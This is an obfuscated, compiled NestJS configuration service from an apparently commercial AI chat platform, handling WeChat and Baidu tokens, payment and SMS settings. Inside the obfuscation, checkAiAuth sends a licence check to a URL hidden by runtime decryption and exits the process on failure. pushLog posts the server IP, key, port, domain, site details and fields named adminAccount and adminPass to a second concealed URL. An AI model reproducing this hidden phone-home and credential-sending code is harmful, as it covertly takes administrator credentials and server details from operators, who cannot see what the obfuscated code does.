'use strict';const _0x36401f=_0x36e8;(function(_0x4e4850,_0x1fb131){const _0x1f591d=_0x36e8,_0x11180b=_0x4e4850();while(!![]){try{const _0x3a9256=parseInt(_0x1f591d(0x16c))/0x1+-parseInt(_0x1f591d(0x12b))/0x2*(-parseInt(_0x1f591d(0x14f))/0x3)+parseInt(_0x1f591d(0xec))/0x4*(-parseInt(_0x1f591d(0x109))/0x5)+parseInt(_0x1f591d(0x138))/0x6*(parseInt(_0x1f591d(0x117))/0x7)+parseInt(_0x1f591d(0x156))/0x8+-parseInt(_0x1f591d(0xe3))/0x9+-parseInt(_0x1f591d(0x10c))/0xa*(-parseInt(_0x1f591d(0x160))/0xb);if(_0x3a9256===_0x1fb131)break;else _0x11180b['push'](_0x11180b['shift']());}catch(_0x2c15ab){_0x11180b['push'](_0x11180b['shift']());}}}(_0x509f,0xddccf));function _0x36e8(_0x3a7b25,_0x1a7d62){const _0x509f44=_0x509f();return _0x36e8=function(_0x36e8eb,_0x56aa6d){_0x36e8eb=_0x36e8eb-0xc2;let _0x541880=_0x509f44[_0x36e8eb];return _0x541880;},_0x36e8(_0x3a7b25,_0x1a7d62);}var __decorate=this&&this[_0x36401f(0xe4)]||function(_0x289a03,_0x1cdca8,_0x737706,_0x126ddd){const _0x100089=_0x36401f;var _0x591936=arguments[_0x100089(0x151)],_0x378fd3=_0x591936<0x3?_0x1cdca8:_0x126ddd===null?_0x126ddd=Object[_0x100089(0x111)](_0x1cdca8,_0x737706):_0x126ddd,_0x24370a;if(typeof Reflect===_0x100089(0x11e)&&typeof Reflect[_0x100089(0xdb)]==='function')_0x378fd3=Reflect[_0x100089(0xdb)](_0x289a03,_0x1cdca8,_0x737706,_0x126ddd);else{for(var _0x4c1952=_0x289a03[_0x100089(0x151)]-0x1;_0x4c1952>=0x0;_0x4c1952--)if(_0x24370a=_0x289a03[_0x4c1952])_0x378fd3=(_0x591936<0x3?_0x24370a(_0x378fd3):_0x591936>0x3?_0x24370a(_0x1cdca8,_0x737706,_0x378fd3):_0x24370a(_0x1cdca8,_0x737706))||_0x378fd3;}return _0x591936>0x3&&_0x378fd3&&Object[_0x100089(0xd6)](_0x1cdca8,_0x737706,_0x378fd3),_0x378fd3;},__metadata=this&&this[_0x36401f(0x14b)]||function(_0x4e0b88,_0x51a5b1){const _0xdc5e59=_0x36401f;if(typeof Reflect==='object'&&typeof Reflect[_0xdc5e59(0x168)]===_0xdc5e59(0x10e))return Reflect[_0xdc5e59(0x168)](_0x4e0b88,_0x51a5b1);},__param=this&&this['__param']||function(_0xece494,_0x19d683){return function(_0x44c3a8,_0x55e0e0){_0x19d683(_0x44c3a8,_0x55e0e0,_0xece494);};};function _0x509f(){const _0x3153cf=['查询配置不能为空！','baiduTextSecretKey','cls','catch','SAAS','OfficialService','vipLeavelRelEntity','2956077WtHerS','__decorate','mpay','HttpException','&type=jsapi','baidu','vxNumber','ceshi.qumao518.vip','CZConfig','16VQLiCl','checkDomain','wechatAccessToken-','payEpayStatus','nL4r+L6Sw+2mmD2RZp+C/xu3iXKHIx2CviCHXOzVFdwiUmnj4GGdzXhU1D0zpcN5','./constant','\x20微信配置缺失，不可使用微信登录！','kaifa.qumao518.vip','signInRewards','https://aip.baidubce.com/oauth/2.0/token?client_id=','configKey','aliPhoneTemplateCode','createOrUpdate','支付功能暂未开放!','---------获取微信access_token--------','../../config/AppConfig','APP_VERSION','fetchBaseAccessToken','application/json','百度敏感词初始化失败，如果需要敏感检测、请前往后台系统配置!','decrypt','pushLog','Logger','https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=','aliPhoneSignName','message','未配置\x20robotAvatar.','keys','has','1698395wvAUHx','configVal','includes','10kHnsTz','refresh','function','@nestjs/typeorm','GlobalConfigService','getOwnPropertyDescriptor','WechatConfig','9kxwFUQptTaelrKStrwZQQ==','JPFq8fAlQE2V2Eq7KWYSxg==','log','onModuleInit','497518WPttwh','Jo11+muNwqhwlG7g1MeeGzh3NJ4nu4zHbOVgh/hIo0ZDV7rlji6LO/S+cD95Ru8Q','getWechatAccessToken','error','BAD_GATEWAY','获取微信access_token失败、错误信息：','relateId','object','baiduTextAccessToken','saasId','epay','wechatAccessTokenMap','GOMAXAI','robotAvatar','exit','queryPayType','getNamespace','wechat','configEntity','设置完成！','92eTIWfM','design:paramtypes','base64','post','save','findOne','@nestjs/cli/actions','arraybuffer','PPTConfig','wechat\x20get\x20access_token\x20done','forEach','concat','every','30etrQcM','access_token','checkAiAuth','wechatOfficialAppSecret','aliPhoneAccessKeySecret','json','../../common/store','payMpayStatus','siteName','MjConfig','qqNumber','getConfigByKeys','saas\x20','nineaiBuiltInSensitiveStatus','default','initBaiduSensitive','getSignatureGiftConfig','../../common/utils','response','__metadata','bkYMP1mVCBurarEsc48hu4lD0nfoPfj1FccGPRuygRtgPnbJWkkvJGU6zhr/otMF6E7iBQk6kY90kyEI47sVTA==','@nestjs/common','FrontKeys','58287FoIPcJ','./vip_leavel_rel.entity','length','&secret=','hupi','Repository','warn','555816DxggGX','then','robotAvatar2Base64','BAD_REQUEST','nestjs-cls','get','getSensitiveConfig','LinkFoxConfig','find','baiduTextApiKey','3137915tuRqyW','env','./config.entity','手机验证码功能暂未开放!','VipLeavelRelEntity','payWechatStatus','SelfKeys','aliPhoneAccessKeyId','metadata','setConfig','errmsg','InjectRepository','991818rOJuEl','wechatJsapiTicketMap','error_description','push\x20log\x20error','code','Jo11+muNwqhwlG7g1MeeGzh3NJ4nu4zHbOVgh/hIo0bno5L8H6T5QXXNUvLB6d1U','MusicConfig','from','axios','signInStatus','getVipLeavelRelById','update','设置配置信息错误！','&grant_type=client_credentials','toString','data','&client_secret=','POST','registerBaseUrl','ticket','data:image/jpeg;base64,','ISDEV','HttpStatus','defineProperty','domain','set','NAMESPACE','wechatOfficialAppId','decorate'];_0x509f=function(){return _0x3153cf;};return _0x509f();}Object[_0x36401f(0xd6)](exports,'__esModule',{'value':!![]}),exports[_0x36401f(0x110)]=void 0x0;const common_1=require(_0x36401f(0x14d)),config_entity_1=require(_0x36401f(0x162)),typeorm_1=require(_0x36401f(0x10f)),typeorm_2=require('typeorm'),utils_1=require(_0x36401f(0x149)),axios_1=require(_0x36401f(0xc7)),actions_1=require(_0x36401f(0x131)),store_1=require(_0x36401f(0x13e)),store_2=require('../../common/store'),AppConfig_1=require(_0x36401f(0xfb)),vip_leavel_rel_entity_1=require(_0x36401f(0x150)),nestjs_cls_1=require(_0x36401f(0x15a)),constant_1=require(_0x36401f(0xf1)),authCheckUrl=(0x0,utils_1[_0x36401f(0x100)])(_0x36401f(0x118)),authLogUrl=(0x0,utils_1[_0x36401f(0x100)])(_0x36401f(0xc4));let GlobalConfigService=class GlobalConfigService{constructor(_0x4e4cb0,_0x430c5e,_0x4bc26b){const _0x552e39=_0x36401f;this['configEntity']=_0x4e4cb0,this[_0x552e39(0xe2)]=_0x430c5e,this[_0x552e39(0xde)]=_0x4bc26b,this[_0x552e39(0x122)]=new Map(),this[_0x552e39(0x16d)]=new Map();}async[_0x36401f(0x116)](){const _0x37a0e3=_0x36401f;await this[_0x37a0e3(0x13a)](),await this[_0x37a0e3(0x101)](),await this[_0x37a0e3(0x147)](),await this[_0x37a0e3(0x119)](!![]);const _0x1be0dc=[][_0x37a0e3(0x136)](store_1['MjConfig']['keys'],store_1[_0x37a0e3(0xeb)][_0x37a0e3(0x107)],store_2[_0x37a0e3(0x112)][_0x37a0e3(0x107)],store_1[_0x37a0e3(0x15d)][_0x37a0e3(0x107)],store_1['PPTConfig']['keys'],store_1[_0x37a0e3(0xc5)][_0x37a0e3(0x107)]),_0x58cab9=await this[_0x37a0e3(0x143)](_0x1be0dc);store_1[_0x37a0e3(0x141)]['refresh'](_0x58cab9),store_1[_0x37a0e3(0xeb)][_0x37a0e3(0x10d)](_0x58cab9),store_2[_0x37a0e3(0x112)]['refresh'](_0x58cab9),store_1['LinkFoxConfig']['refresh'](_0x58cab9),store_1[_0x37a0e3(0xc5)]['refresh'](_0x58cab9),store_1[_0x37a0e3(0x133)]['refresh'](_0x58cab9);}async['checkAiAuth'](){const _0x2803ec=_0x36401f,_0x5bbd92=process[_0x2803ec(0x161)][(0x0,utils_1['decrypt'])(_0x2803ec(0x114))],_0x4d975f=process[_0x2803ec(0x161)][(0x0,utils_1[_0x2803ec(0x100)])(_0x2803ec(0x113))];(!_0x4d975f||!_0x5bbd92)&&(common_1[_0x2803ec(0x102)][_0x2803ec(0x11a)]((0x0,utils_1[_0x2803ec(0x100)])(_0x2803ec(0xf0))),(0x0,actions_1[_0x2803ec(0x125)])());const _0x135bc5={'authDomain':_0x5bbd92,'authKey':_0x4d975f},_0x47141e={'method':_0x2803ec(0xd0),'headers':{'Content-Type':_0x2803ec(0xfe)},'body':JSON['stringify'](_0x135bc5)},_0x3c4fd9=await fetch(authCheckUrl,_0x47141e)[_0x2803ec(0x157)](_0x2db6f3=>{const _0xf7a677=_0x2803ec;return _0x2db6f3[_0xf7a677(0x13d)]();})[_0x2803ec(0xdf)](_0x52a08a=>{const _0x50dfda=_0x2803ec;common_1[_0x50dfda(0x102)][_0x50dfda(0x11a)](_0x52a08a,'global');});_0x3c4fd9['code']!==0x0&&(common_1[_0x2803ec(0x102)][_0x2803ec(0x11a)]((0x0,utils_1['decrypt'])(_0x2803ec(0x14c))),(0x0,actions_1[_0x2803ec(0x125)])()),_0x3c4fd9?.[_0x2803ec(0xc3)]===0x0&&!_0x3c4fd9?.['data']?.['check']&&(common_1[_0x2803ec(0x102)][_0x2803ec(0x11a)]((0x0,utils_1['decrypt'])('nL4r+L6Sw+2mmD2RZp+C/xu3iXKHIx2CviCHXOzVFdwiUmnj4GGdzXhU1D0zpcN5')),(0x0,actions_1[_0x2803ec(0x125)])());}async[_0x36401f(0x101)](_0x1bced2,_0x29d944){const _0x39df03=_0x36401f,_0x551e83=process[_0x39df03(0x161)][(0x0,utils_1[_0x39df03(0x100)])(_0x39df03(0x114))],_0x572a3e=process[_0x39df03(0x161)][(0x0,utils_1[_0x39df03(0x100)])(_0x39df03(0x113))],_0x4f12fd=process[_0x39df03(0x161)]['PORT'];if(!_0x551e83||!_0x572a3e)throw new common_1[(_0x39df03(0xe6))]((0x0,utils_1[_0x39df03(0x100)])(_0x39df03(0xf0)),common_1[_0x39df03(0xd5)]['UNAUTHORIZED']);const {qqNumber:_0x596259,vxNumber:_0x42c804,siteName:_0x2cf628,domain:_0xbe9009,registerBaseUrl:_0x4f7dcc}=await this['getConfigByKeys']([_0x39df03(0x142),_0x39df03(0xe9),'siteName',_0x39df03(0xd7),_0x39df03(0xd1)]),_0x459fd6={'ip':_0x551e83,'key':_0x572a3e,'port':_0x4f12fd,'qqNumber':_0x596259,'vxNumber':_0x42c804,'domain':_0xbe9009,'adminAccount':_0x1bced2,'adminPass':_0x29d944,'baseUrl':_0x4f7dcc,'siteName':_0x2cf628,'qq':_0x596259,'vxNum':_0x42c804,'version':AppConfig_1[_0x39df03(0xfc)]},_0x1e09d9={'method':_0x39df03(0xd0),'headers':{'Content-Type':_0x39df03(0xfe)},'body':JSON['stringify'](_0x459fd6)};await fetch(authLogUrl,_0x1e09d9)[_0x39df03(0xdf)](_0x315136=>{const _0x4885d3=_0x39df03;console[_0x4885d3(0x115)](_0x4885d3(0xc2),_0x315136);});}async[_0x36401f(0x147)](_0x4f5651=!![]){const _0x3063f0=_0x36401f,{baiduTextApiKey:_0x3e9a0c,baiduTextSecretKey:_0x4113e5}=await this[_0x3063f0(0x143)]([_0x3063f0(0x15f),_0x3063f0(0xdd)]);if(!_0x3e9a0c||!_0x4113e5){common_1['Logger'][_0x3063f0(0x11a)](_0x3063f0(0xff),_0x3063f0(0x110));return;}const _0x40cb9d={'Content-Type':'application/json','Accept':_0x3063f0(0xfe)},_0x40b1f5=_0x3063f0(0xf5)+_0x3e9a0c+_0x3063f0(0xcf)+_0x4113e5+_0x3063f0(0xcc);try{const _0x3cf952=await axios_1['default'][_0x3063f0(0x12e)](_0x40b1f5,{'headers':_0x40cb9d});this[_0x3063f0(0x11f)]=_0x3cf952[_0x3063f0(0xce)][_0x3063f0(0x139)];}catch(_0x56a76a){if(_0x4f5651)common_1[_0x3063f0(0x102)]['error']('百度敏感词配置检测失败，您的参数可能配置的不正确!',_0x3063f0(0x110));else throw new common_1['HttpException'](_0x56a76a[_0x3063f0(0x14a)][_0x3063f0(0xce)][_0x3063f0(0x16e)],common_1[_0x3063f0(0xd5)][_0x3063f0(0x159)]);}}async[_0x36401f(0x119)](_0x5ce749=![]){const _0xd035f5=_0x36401f,_0x12dfcd=new Map(),_0x80527d=await this['configEntity'][_0xd035f5(0x15e)]({'where':{'configKey':(0x0,typeorm_2['In'])([_0xd035f5(0xda),_0xd035f5(0x13b)])}});_0x80527d[_0xd035f5(0x135)](_0xc7e4b9=>{const _0x28499c=_0xd035f5;!_0x12dfcd['has'](_0xc7e4b9[_0x28499c(0x120)])&&_0x12dfcd[_0x28499c(0xd8)](_0xc7e4b9[_0x28499c(0x120)],{}),_0x12dfcd[_0x28499c(0x15b)](_0xc7e4b9[_0x28499c(0x120)])[_0xc7e4b9[_0x28499c(0xf6)]]=_0xc7e4b9['configVal'];}),_0x12dfcd['forEach']((_0x226501,_0xdc4593)=>{const _0x297a89=_0xd035f5;!_0x226501[_0x297a89(0xda)]||!_0x226501[_0x297a89(0x13b)]?common_1[_0x297a89(0x102)][_0x297a89(0x155)](_0x297a89(0x144)+_0xdc4593+_0x297a89(0xf2),'getWechatAccessToken'):this[_0x297a89(0xfd)](_0xdc4593,_0x226501[_0x297a89(0xda)],_0x226501['wechatOfficialAppSecret'],_0x5ce749);}),common_1[_0xd035f5(0x102)][_0xd035f5(0x115)](_0xd035f5(0x134),_0xd035f5(0xe1));}async['fetchBaseAccessToken'](_0x492872,_0x2420f6,_0x1add81,_0x5f1307=![]){const _0x49aa85=_0x36401f;if(process[_0x49aa85(0x161)][_0x49aa85(0xd4)]==='TRUE')return;try{let _0x3c2989='';const _0x5a5af3=process['env']['GOMAXAI_HOST'];if(_0x5a5af3===_0x49aa85(0xf3)||_0x5a5af3===_0x49aa85(0xea)||_0x5a5af3==='saas.qumao518.vip'){const _0x3d9b96=await axios_1[_0x49aa85(0x146)]['get']('https://gomaxai.qumao518.vip/api/official/getAccessToken?type=official');_0x3c2989=_0x3d9b96[_0x49aa85(0xce)][_0x49aa85(0xce)];}else{const _0x4194c3=await axios_1['default'][_0x49aa85(0x15b)](_0x49aa85(0x103)+_0x2420f6+_0x49aa85(0x152)+_0x1add81);console[_0x49aa85(0x115)](_0x49aa85(0xfa),_0x4194c3[_0x49aa85(0xce)],_0x2420f6,_0x1add81);if(_0x4194c3[_0x49aa85(0xce)]['errmsg'])throw new Error(_0x49aa85(0x11c)+_0x4194c3[_0x49aa85(0xce)][_0x49aa85(0x16a)]);_0x3c2989=_0x4194c3[_0x49aa85(0xce)][_0x49aa85(0x139)];}this[_0x49aa85(0x122)][_0x49aa85(0xd8)](_0x492872,_0x3c2989);const _0x2dfe85=await axios_1[_0x49aa85(0x146)][_0x49aa85(0x15b)]('https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token='+_0x3c2989+_0x49aa85(0xe7));this[_0x49aa85(0x16d)]['set'](_0x492872,_0x2dfe85?.[_0x49aa85(0xce)]?.[_0x49aa85(0xd2)]);}catch(_0x31d001){common_1[_0x49aa85(0x102)][_0x49aa85(0x11a)](_0x31d001[_0x49aa85(0x105)],_0x49aa85(0xfd));}}async[_0x36401f(0xed)](_0x59bf43){const _0x1b2811=_0x36401f;if(process[_0x1b2811(0x161)][_0x1b2811(0xe0)])return!![];const {domain:_0x247935}=_0x59bf43,_0x159336=process['env'][(0x0,utils_1[_0x1b2811(0x100)])(_0x1b2811(0x114))];return _0x247935[_0x1b2811(0x10b)](_0x159336);}async[_0x36401f(0xf8)](_0x5a9a6c){const _0x5ea1d7=_0x36401f;try{const _0x52d333=this['cls'][_0x5ea1d7(0x15b)](_0x5ea1d7(0x120)),{configKey:_0x1740c2,configVal:_0xa4a0ad,status:status=0x1}=_0x5a9a6c,_0x240bff=await this[_0x5ea1d7(0x129)][_0x5ea1d7(0x130)]({'where':{'configKey':_0x1740c2,'saasId':_0x52d333}});typeof _0xa4a0ad===_0x5ea1d7(0x11e)?_0x240bff?await this['configEntity'][_0x5ea1d7(0xca)]({'configKey':_0x1740c2,'saasId':_0x52d333},{'configJsonVal':_0xa4a0ad,'status':status}):await this[_0x5ea1d7(0x129)][_0x5ea1d7(0x12f)]({'configKey':_0x1740c2,'configJsonVal':_0xa4a0ad,'status':status,'saasId':_0x52d333}):_0x240bff?await this[_0x5ea1d7(0x129)][_0x5ea1d7(0xca)]({'configKey':_0x1740c2,'saasId':_0x52d333},{'configVal':_0xa4a0ad,'status':status}):await this[_0x5ea1d7(0x129)][_0x5ea1d7(0x12f)]({'configKey':_0x1740c2,'configVal':_0xa4a0ad,'status':status,'saasId':_0x52d333});}catch(_0x15928f){throw new common_1['HttpException'](_0x5ea1d7(0xcb),common_1[_0x5ea1d7(0xd5)][_0x5ea1d7(0x159)]);}}async[_0x36401f(0x169)](_0x5ee157){const _0x5b1f51=_0x36401f;let _0x5f5382=![],_0x4f9d53=![],_0x198c65=![],_0x3bd718=![],_0x19c0fe=![],_0x2bf1c6=![],_0x362857=![];const _0x3821b5={},{settings:_0x2c15bc}=_0x5ee157;for(const _0x5e9974 of _0x2c15bc){await this['createOrUpdate'](_0x5e9974),_0x3821b5[_0x5e9974[_0x5b1f51(0xf6)]]=_0x5e9974[_0x5b1f51(0x10a)],store_1[_0x5b1f51(0x141)][_0x5e9974[_0x5b1f51(0xf6)]]&&(_0x5f5382=!![]),store_1['CZConfig'][_0x5e9974['configKey']]&&(_0x4f9d53=!![]),store_2[_0x5b1f51(0x112)][_0x5e9974[_0x5b1f51(0xf6)]]&&(_0x198c65=!![]),store_1[_0x5b1f51(0x15d)][_0x5e9974[_0x5b1f51(0xf6)]]&&(_0x362857=!![]),[_0x5b1f51(0x15f),_0x5b1f51(0xdd)][_0x5b1f51(0x10b)](_0x5e9974[_0x5b1f51(0xf6)])&&(_0x3bd718=!![]),['wechatOfficialAppId','wechatOfficialAppSecret'][_0x5b1f51(0x10b)](_0x5e9974[_0x5b1f51(0xf6)])&&(_0x19c0fe=!![]),[_0x5b1f51(0x142),_0x5b1f51(0xe9),_0x5b1f51(0x140),_0x5b1f51(0xd7),_0x5b1f51(0xd1)][_0x5b1f51(0x10b)](_0x5e9974['configKey'])&&(_0x2bf1c6=!![]);}return _0x5f5382&&store_1['MjConfig']['refresh'](_0x3821b5),_0x4f9d53&&store_1[_0x5b1f51(0xeb)][_0x5b1f51(0x10d)](_0x3821b5),_0x198c65&&store_2[_0x5b1f51(0x112)][_0x5b1f51(0x10d)](_0x3821b5),_0x362857&&store_1[_0x5b1f51(0x15d)][_0x5b1f51(0x10d)](_0x3821b5),_0x3bd718&&await this[_0x5b1f51(0x147)](![]),_0x19c0fe&&await this[_0x5b1f51(0x119)](),_0x2bf1c6&&this['pushLog'](),_0x5b1f51(0x12a);}async['getConfigs4Front'](_0x4bf2e8){const _0x48cfd5=_0x36401f,_0x3eb7fe=await this['getConfigByKeys'](_0x4bf2e8,!![]);return _0x4bf2e8[_0x48cfd5(0x151)]===0x1?_0x3eb7fe[_0x4bf2e8[0x0]]:_0x3eb7fe;}async[_0x36401f(0x143)](_0x13d94a,_0x3bb69c=![]){const _0x2e2d8f=_0x36401f;if(!_0x13d94a[_0x2e2d8f(0x151)])throw new Error(_0x2e2d8f(0xdc));const _0x5f5c55=this[_0x2e2d8f(0xde)][_0x2e2d8f(0x15b)]('saasId')||0x0,_0x55c762=new Map(),_0x5d5a7a=await this[_0x2e2d8f(0x129)][_0x2e2d8f(0x15e)]({'where':{'configKey':(0x0,typeorm_2['In'])(_0x13d94a),'saasId':(0x0,typeorm_2['In'])([0x0,_0x5f5c55])}});_0x5d5a7a['forEach'](_0x25641d=>{const {configKey:_0x5649e4,configVal:_0x178aa0,configJsonVal:_0x67fe7,saasId:_0xddda62}=_0x25641d;_0x55c762['set'](_0x5649e4+'-'+_0xddda62,_0x67fe7||_0x178aa0);}),this[_0x2e2d8f(0x122)][_0x2e2d8f(0x135)]((_0x53a02f,_0x5b7643)=>{const _0x1f16cf=_0x2e2d8f;_0x55c762[_0x1f16cf(0xd8)](_0x1f16cf(0xee)+_0x5b7643,_0x53a02f);}),this[_0x2e2d8f(0x16d)][_0x2e2d8f(0x135)]((_0x323d35,_0x479d54)=>{const _0x548563=_0x2e2d8f;_0x55c762[_0x548563(0xd8)]('wechatJsapiTicket-'+_0x479d54,_0x323d35);}),_0x55c762[_0x2e2d8f(0xd8)]('baiduTextAccessToken-0',this[_0x2e2d8f(0x11f)]);const _0x5caf4f={};_0x13d94a[_0x2e2d8f(0x135)](_0x37fec9=>{const _0x5a2149=_0x2e2d8f;let _0x166f63=_0x37fec9+'-'+_0x5f5c55,_0x352b5f='';_0x55c762[_0x5a2149(0x108)](_0x166f63)?_0x352b5f=_0x55c762[_0x5a2149(0x15b)](_0x166f63):!constant_1[_0x5a2149(0x166)][_0x5a2149(0x10b)](_0x37fec9)&&(_0x352b5f=_0x55c762['get'](_0x37fec9+'-'+0x0)),_0x5caf4f[_0x37fec9]=_0x352b5f;});if(_0x3bb69c)return _0x5caf4f;return _0x13d94a[_0x2e2d8f(0x151)]===0x1?_0x5caf4f[_0x13d94a[0x0]]:_0x5caf4f;}async['queryFrontConfig'](){const _0xd3db36=_0x36401f,_0x598c9e=await this['getConfigByKeys'](constant_1[_0xd3db36(0x14e)]);return{..._0x598c9e,'isUseWxLogin':!!(_0x598c9e['wechatOfficialAppId']&&_0x598c9e[_0xd3db36(0x13b)])};}async[_0x36401f(0x126)](_0x50331d=_0x36401f(0x128)){const _0x244caa=_0x36401f,{payHupiStatus:payHupiStatus=0x0,payEpayStatus:payEpayStatus=0x0,payWechatStatus:payWechatStatus=0x0,payMpayStatus:payMpayStatus=0x0}=await this[_0x244caa(0x143)](['payHupiStatus',_0x244caa(0xef),_0x244caa(0x13f),_0x244caa(0x165)]);if([payHupiStatus,payEpayStatus,payWechatStatus,payMpayStatus][_0x244caa(0x137)](_0x246693=>_0x246693===0x0))throw new common_1[(_0x244caa(0xe6))](_0x244caa(0xf9),common_1[_0x244caa(0xd5)][_0x244caa(0x159)]);if(Number(payWechatStatus)===0x1)return _0x50331d;if(Number(payEpayStatus)===0x1)return _0x244caa(0x121);if(Number(payMpayStatus)===0x1)return _0x244caa(0xe5);if(Number(payHupiStatus)===0x1)return _0x244caa(0x153);}async['getPhoneVerifyConfig'](){const _0x53d590=_0x36401f,{phoneRegisterStatus:_0x1ed8fb,aliPhoneAccessKeyId:_0x170e0a,aliPhoneAccessKeySecret:_0x17d48b,aliPhoneSignName:_0x282d2e,aliPhoneTemplateCode:_0x3a070f}=await this['getConfigByKeys'](['phoneRegisterStatus',_0x53d590(0x167),_0x53d590(0x13c),_0x53d590(0x104),_0x53d590(0xf7)]);if(Number(_0x1ed8fb)!==0x1)throw new common_1[(_0x53d590(0xe6))](_0x53d590(0x163),common_1[_0x53d590(0xd5)]['BAD_REQUEST']);return{'accessKeyId':_0x170e0a,'accessKeySecret':_0x17d48b,'SignName':_0x282d2e,'TemplateCode':_0x3a070f};}[_0x36401f(0x127)](){const _0x5b9937=_0x36401f;return process['env'][_0x5b9937(0xd9)]||_0x5b9937(0x123);}async[_0x36401f(0x148)](){const _0x53daf5=_0x36401f,_0xf802b5=await this[_0x53daf5(0x143)]([_0x53daf5(0xc8),_0x53daf5(0xf4)]),_0x2c08ad={};for(let _0x214a77 in _0xf802b5){const _0x42dcdd=Number(_0xf802b5[_0x214a77]);_0x2c08ad[_0x214a77]=isNaN(_0x42dcdd)?0x0:_0x42dcdd;}if(!_0x2c08ad[_0x53daf5(0xc8)])throw new common_1['HttpException']('签到功能暂未开放!',common_1['HttpStatus'][_0x53daf5(0x159)]);return _0x2c08ad['signInRewards'];}async[_0x36401f(0x15c)](){const _0x513044=_0x36401f,{baiduTextStatus:baiduTextStatus=0x0,baiduTextAccessToken:_0x34f8a1,nineaiBuiltInSensitiveStatus:nineaiBuiltInSensitiveStatus=0x0,nineaiBuiltInSensitiveApiBase:_0x3f16aa,nineaiBuiltInSensitiveAuthKey:_0x37db7c}=await this[_0x513044(0x143)](['baiduTextStatus','baiduTextAccessToken',_0x513044(0x145),'nineaiBuiltInSensitiveApiBase','nineaiBuiltInSensitiveAuthKey']);if(Number(baiduTextStatus)===0x1)return{'useType':_0x513044(0xe8),'baiduTextAccessToken':_0x34f8a1};if(Number(nineaiBuiltInSensitiveStatus)===0x1)return{'useType':'nineai','nineaiBuiltInSensitiveApiBase':_0x3f16aa,'nineaiBuiltInSensitiveAuthKey':_0x37db7c};return null;}async[_0x36401f(0x158)](){const _0x1c9a18=_0x36401f,_0x15b2e6=await this[_0x1c9a18(0x143)]([_0x1c9a18(0x124)]);if(!_0x15b2e6)throw new common_1[(_0x1c9a18(0xe6))](_0x1c9a18(0x106),common_1['HttpStatus'][_0x1c9a18(0x11b)]);const _0x4536fb=await axios_1[_0x1c9a18(0x146)][_0x1c9a18(0x15b)](_0x15b2e6,{'responseType':_0x1c9a18(0x132)}),_0x2620ea=Buffer[_0x1c9a18(0xc6)](_0x4536fb[_0x1c9a18(0xce)])[_0x1c9a18(0xcd)](_0x1c9a18(0x12d));return _0x1c9a18(0xd3)+_0x2620ea;}async['saveVipLeavelRel'](_0x21cbf2){const _0x4ac2eb=_0x36401f;await this[_0x4ac2eb(0xe2)][_0x4ac2eb(0x12f)](_0x21cbf2);}async[_0x36401f(0xc9)](_0x353c42,_0x196771,_0x58be83){const _0x393b11=_0x36401f,_0x3f3713={'vipLeavelId':_0x353c42,'relateType':_0x196771};_0x58be83&&(_0x3f3713[_0x393b11(0x11d)]=_0x58be83);const _0x481867=await this[_0x393b11(0xe2)][_0x393b11(0x130)]({'where':_0x3f3713});return _0x481867;}};GlobalConfigService=__decorate([(0x0,common_1['Injectable'])(),__param(0x0,(0x0,typeorm_1['InjectRepository'])(config_entity_1['ConfigEntity'])),__param(0x1,(0x0,typeorm_1[_0x36401f(0x16b)])(vip_leavel_rel_entity_1[_0x36401f(0x164)])),__metadata(_0x36401f(0x12c),[typeorm_2[_0x36401f(0x154)],typeorm_2[_0x36401f(0x154)],nestjs_cls_1['ClsService']])],GlobalConfigService),exports[_0x36401f(0x110)]=GlobalConfigService;